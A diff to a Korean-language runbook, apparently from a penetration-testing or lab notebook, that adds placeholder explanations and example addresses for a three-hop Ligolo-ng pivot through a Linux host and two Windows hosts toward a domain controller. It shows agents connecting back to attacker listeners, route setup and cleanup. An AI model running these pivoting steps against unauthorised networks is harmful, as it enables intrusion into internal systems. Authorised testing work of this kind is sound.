@@ -56,6 +56,13 @@ Linux 공격 호스트
 
 `<THIS_TUN>`과 `<LIGOLO_WORKDIR>`는 이번 실행에만 사용할 고유한 이름과 절대 경로로 정한다. 실제 PID·세션 ID·listener ID·호스트 주소와 자격 증명은 현재 작업 기록에만 남기고 Vault에는 저장하지 않는다.
 
+| 입력 묶음 | 역할·형식·출처 | 가상 예시 |
+|---|---|---|
+| `<ATTACK_IP>`, `<LINUX_PIVOT_IP>`, `<WINDOWS1_IP>`, `<DC_IP>` | 각 홉에서 다음 홉으로 도달하는 IPv4 주소이며, 해당 호스트의 `ipconfig`·`ip route`·세션 출력에서 얻는다. | `192.0.2.10`, `192.0.2.20`, `192.0.2.30`, `192.0.2.53` |
+| `<WINDOWS2_DEEP_CIDR>`, `<THIS_TUN>` | Windows2에서 보인 최종 내부 CIDR과 공격 호스트에 새로 만들 TUN 이름이다. | `198.51.100.0/24`, `ligolo-p03` |
+| `*_AGENT_PATH`, `<LIGOLO_PROXY_PATH>`, `<LIGOLO_WORKDIR>` | 각 실행 호스트의 절대 실행 파일 경로와 공격 호스트의 새 작업 디렉터리다. | `C:\\Tools\\agent.exe`, `/opt/ligolo/proxy`, `/tmp/ligolo-p03` |
+| `*_PID`, `*_AGENT_ID`, `*_LISTENER_ID` | 해당 단계의 `ps`·`Get-CimInstance`·`tunnel_list`·`listener_list` 출력에서 기록한 식별자다. | `1234`, `2`, `1` |
+
 Linux 공격 호스트에서 기존 interface·route·listener·프로세스와 작업 디렉터리를 확인한다.
 
 ```bash
@@ -85,6 +92,8 @@ test -e '<LIGOLO_WORKDIR>' && find '<LIGOLO_WORKDIR>' -maxdepth 2 -printf '%P\n'
 
 Linux 피벗에서 DC의 핵심 TCP 포트를 확인한다.
 
+`<DC_IP>`는 Windows2에서 확인한 최종 DC의 IPv4 주소(예: `192.0.2.53`)이며, 이 Linux 명령은 Linux 피벗 호스트에서 실행한다. 바로 아래 Windows 명령도 같은 `<DC_IP>`를 사용한다.
+
 ```bash
 ip -br addr
 ip route
@@ -109,6 +118,8 @@ Windows2에서만 `TcpTestSucceeded : True`가 나오면 3홉 경로가 필요�
 
 Linux 공격 호스트에서 Ligolo-ng proxy용 TUN 인터페이스를 만들고 proxy를 실행한다.
 
+`<THIS_TUN>`은 작업 전 존재하지 않는 공격 호스트 TUN 이름, `<LIGOLO_WORKDIR>`은 같은 호스트의 새 절대 작업 디렉터리, `<LIGOLO_PROXY_PATH>`는 설치된 proxy의 절대 실행 경로다. 예시는 각각 `ligolo-p03`, `/tmp/ligolo-p03`, `/opt/ligolo/proxy`다.
+
 ```bash
 sudo ip tuntap add user "$(whoami)" mode tun '<THIS_TUN>'
 sudo ip link set '<THIS_TUN>' up
@@ -121,6 +132,8 @@ cd -- '<LIGOLO_WORKDIR>'
 다른 공격 호스트 셸에서 `ss -ltnp 'sport = :11601'`과 `ps`로 방금 시작한 proxy의 PID·실행 경로·시작 시각을 `<LIGOLO_PROXY_PID>`로 기록한다. v0.8 이상이면 `<LIGOLO_WORKDIR>` 안에서 새로 생성된 설정·history·selfcert cache 경로도 기록한다.
 
 Linux 피벗에서 첫 agent를 연결한다.
+
+`<LINUX_AGENT_PATH>`는 Linux 피벗에 이미 있는 agent 절대 경로이고, `<ATTACK_IP>`는 proxy listener를 실행한 공격 호스트 IPv4 주소(예: `192.0.2.10`)다. 아래 PID는 이 명령행을 포함한 `ps` 출력의 PID 필드에서 기록한다.
 
 ```bash
 '<LINUX_AGENT_PATH>' -connect <ATTACK_IP>:11601 -ignore-cert
@@ -151,6 +164,8 @@ listener_list
 
 Windows1에서 Linux 피벗 listener로 agent를 연결한다.
 
+`<WINDOWS1_AGENT_PATH>`는 Windows1의 agent 절대 경로(예: `C:\\Tools\\ligolo-agent.exe`)이며, `<LINUX_PIVOT_IP>`는 바로 앞 listener를 가진 Linux 피벗 IPv4 주소다. `<WINDOWS1_AGENT_PID>`는 아래 `ProcessId` 출력 필드에서 기록한다.
+
 ```powershell
 & '<WINDOWS1_AGENT_PATH>' -connect <LINUX_PIVOT_IP>:4444 -ignore-cert
 ```
@@ -174,6 +189,8 @@ listener_list
 
 Windows2에서 Windows1 listener로 agent를 연결한다.
 
+`<WINDOWS2_AGENT_PATH>`는 Windows2의 agent 절대 경로이고, `<WINDOWS1_IP>`는 Windows1 listener IPv4 주소다. `<WINDOWS2_AGENT_PID>`는 아래 `ProcessId` 출력 필드에서 기록한다.
+
 ```powershell
 & '<WINDOWS2_AGENT_PATH>' -connect <WINDOWS1_IP>:4445 -ignore-cert
 ```
@@ -189,6 +206,8 @@ Proxy 콘솔의 `tunnel_list`에 Linux 피벗, Windows1, Windows2 세션이 각�
 ## 4. Windows2의 최종 내부망 route 연결
 
 proxy 콘솔에서 Windows2 세션을 선택하고 최종 내부망 CIDR을 Ligolo 인터페이스에 연결한다.
+
+`<THIS_TUN>`은 2단계에서 만든 같은 공격 호스트 interface이고, `<WINDOWS2_DEEP_CIDR>`은 Windows2 route 출력에서 얻은 CIDR(예: `198.51.100.0/24`)이다. 선택한 session은 `tunnel_list`에서 Windows2 agent 경로와 연결 주소가 일치한 행이다.
 
 ```text
 session
@@ -372,7 +391,7 @@ interface_delete --name <THIS_TUN>
 interface_list
 ```
 
-`interface_delete`가 설정과 route 제거 여부를 묻는 버전에서는 `<THIS_TUN>`이 이번 작업의 고유 interface임을 다시 확인한 뒤 승인한다. 이어 Linux 공격 호스트에서 실제 route와 interface도 확인한다.
+`interface_delete`가 설정과 route 제거 여부를 묻는 버전에서는 `<THIS_TUN>`이 이번 작업의 고유 interface임을 다시 확인한 뒤 해당 항목을 선택한다. 이어 Linux 공격 호스트에서 실제 route와 interface도 확인한다.
 
 ```bash
 ip route show '<WINDOWS2_DEEP_CIDR>' dev '<THIS_TUN>'
